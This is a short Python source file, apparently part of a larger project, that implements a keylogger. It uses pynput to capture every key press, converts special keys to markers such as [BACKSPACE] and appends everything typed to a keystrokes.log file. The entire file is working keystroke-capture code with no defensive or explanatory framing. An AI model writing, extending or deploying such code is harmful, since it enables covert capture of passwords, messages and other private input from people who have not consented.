from pynput.keyboard import Listener
from config import LOG_PATH
import os

def log_keystroke(key):
    log_file = os.path.join(LOG_PATH, "keystrokes.log")
    key = str(key).replace("'", "")
    
    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.backspace": "[BACKSPACE]",
        "Key.tab": "[TAB]",
        "Key.esc": "[ESC]"
    }
    
    key = special_keys.get(key, f" {key} ")
    
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(key)
    except Exception as e:
        print(f"Keystroke Log Error: {e}")

def start_keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()